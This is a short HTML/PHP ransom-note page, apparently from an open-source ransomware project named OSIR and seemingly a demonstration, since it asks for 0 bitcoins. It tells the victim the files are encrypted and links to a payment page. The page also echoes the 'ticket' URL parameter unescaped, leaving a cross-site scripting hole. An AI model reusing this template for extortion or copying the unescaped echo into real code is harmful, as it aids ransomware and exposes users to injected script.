<html>
	<head>
		<title>Lock page</title>
		<link rel="stylesheet" href="style/main.css">
	</head>
	<body style="background-image:url(lock.png);background-size: 500px 500px;background-repeat: no-repeat;background-position: center;">
		<div class="hcentral">
		<h1>Your Files have been Locked</h1>
			Your files have been safely encrypted with RSA and AES-128 using <a href="https://github.com/Property404/OSIR">OSIR</a>. To retrieve them, please generously donate <code>0</code> bitcoins.
			<p>
			<?php
				echo("<a href='pay.php?ticket=".$_GET['ticket']."'>Pay and receive your decryption key</a>\n");
			?>
			<p>
			
		</div>
	</body>
</html>